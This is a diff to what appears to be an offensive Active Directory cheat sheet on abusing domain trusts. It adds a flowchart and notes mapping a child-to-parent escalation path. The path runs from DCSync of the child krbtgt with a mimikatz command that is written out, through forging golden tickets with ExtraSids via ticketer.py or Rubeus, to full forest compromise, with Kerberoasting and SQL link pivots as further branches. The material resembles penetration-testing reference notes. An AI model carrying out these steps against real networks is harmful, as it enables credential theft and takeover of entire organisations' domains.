@@ -4,6 +4,30 @@
 
 Intra-forest (child→parent) and cross-forest trust abuse. Related: [kerberos-tickets](kerberos-tickets.md) · [dacl-attacks](dacl-attacks.md) · [enumeration](enumeration.md)
 
+## Contents
+- [Enumeration & Mapping](#enumeration--mapping)
+- [Intra-Forest (Child to Parent)](#intra-forest-child-to-parent)
+- [Cross-Forest](#cross-forest)
+- [SQL Server Links (cross-forest pivot)](#sql-server-links-cross-forest-pivot)
+- [GoldenGMSA](#goldengmsa)
+- [ADIDNS / DNS Abuse](#adidns--dns-abuse)
+
+## Trust Abuse Path
+
+```mermaid
+flowchart TD
+    A["Get-ADTrust / Get-DomainTrust / Get-DomainTrustMapping\n(map reachable trusts)"] --> B{Trust direction?}
+    B -->|Child → Parent (intra-forest)| C["DCSync child domain krbtgt\n(lsadump::dcsync /user:DEV\\krbtgt)"]
+    C --> D["Resolve parent's Enterprise Admins SID\n(Get-ADGroup -Server parent)"]
+    D --> E["Forge golden ticket with ExtraSids = parent EA SID\nticketer.py -extra-sid / Rubeus golden /sids"]
+    E --> F["Authenticate to parent domain as Enterprise Admin\n(raiseChild.py automates this)"]
+    B -->|Cross-forest trust| G["Enumerate TrustAttributes (SID filtering / selective auth?)"]
+    G --> H["Kerberoast across the trust (Rubeus /domain:logistics.ad)"]
+    G --> I["Check for SIDHistory abuse opportunities"]
+    G --> J["Pivot via SQL Server links (Get-SQLServerLink / mssqlclient.py)"]
+    F --> K["Full forest compromise"]
+```
+
 ## Enumeration & Mapping
 ```powershell
 Get-ADTrust -Filter *
@@ -26,6 +50,10 @@ Enumerate all reachable domain trusts.
 Map AD with Adalanche.
 
 ## Intra-Forest (Child to Parent)
+
+> [!IMPORTANT]
+> This is the classic "ExtraSids" child→parent escalation: a compromised child domain always has a trust path to compromise the entire forest, because the child's krbtgt can forge a ticket carrying the parent's Enterprise Admins SID in `SIDHistory`.
+
 ```cmd
 .\mimikatz.exe "lsadump::dcsync /user:DEV\krbtgt" exit
 ```
